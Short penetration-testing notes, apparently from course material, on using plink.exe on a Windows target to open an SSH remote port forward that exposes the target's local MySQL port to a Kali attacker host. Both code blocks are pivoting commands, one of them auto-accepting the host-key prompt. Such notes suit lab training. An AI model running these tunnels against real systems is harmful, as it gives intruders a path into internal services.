## Plink Basic Usage

We can use plink.exe to connect via SSH (-ssh) to our Kali machine (10.11.0.4) as the kali
user (-l kali) with a password of “ilak” (-pw ilak) to create a remote port forward (-R) of port
1234 (10.11.0.4:1234) to the MySQL port on the Windows target (127.0.0.1:3306) with the
following command:

```
plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
```

--> Plink is found in /usr/share/windows-binaries
sdf

## Plink auto yes to Cache store question

```
cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
```